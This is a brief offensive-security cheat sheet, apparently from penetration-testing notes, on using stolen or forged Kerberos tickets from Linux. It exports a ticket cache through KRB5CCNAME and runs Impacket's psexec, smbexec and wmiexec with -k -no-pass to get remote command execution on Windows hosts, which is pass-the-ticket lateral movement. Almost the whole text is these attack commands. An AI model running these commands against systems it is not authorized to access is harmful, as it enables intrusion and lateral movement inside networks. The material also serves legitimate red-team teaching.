# Using Kerberos Tickets - from Linux



## Impacket


There are impacket scripts available to use kerberos tickets from a Linux machine.
# Set the ticket for impacket use
export KRB5CCNAME=<TGS_ccache_file>

# Can now use -k with any impacket script to use the kerberos ticket (providing your ticket gives you access to that service)
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
